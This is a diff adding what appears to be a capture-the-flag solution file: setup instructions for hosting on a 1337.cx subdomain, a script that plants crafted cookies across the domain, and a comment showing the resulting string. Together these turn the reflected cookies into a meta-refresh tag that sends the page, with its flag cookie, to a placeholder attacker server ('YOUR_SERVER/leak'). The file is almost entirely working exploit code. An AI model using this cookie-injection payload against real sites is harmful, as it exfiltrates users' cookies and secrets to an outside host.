@@ -1,0 +1,13 @@
+Host this on a subdomain of 1337.cx, which can be registered at https://freedns.afraid.org/
+
+<script>
+	document.cookie = 'flag="start <meta http-equiv=refresh content=\'0 ; domain=1337.cx; path=/aa' // start
+	document.cookie = 'url=https://YOUR_SERVER/leak? ; domain=1337.cx; path=/aa' // mid
+	document.cookie = 'z=\'> end" ; domain=1337.cx;' // end
+	location = 'http://flag.1337.cx/aa'
+</script>
+
+<!--
+then the result becomes:
+start <meta http-equiv=refresh content='0; url=https://YOUR_SERVER/leak?; flag=ictfflag; z='> end
+-->
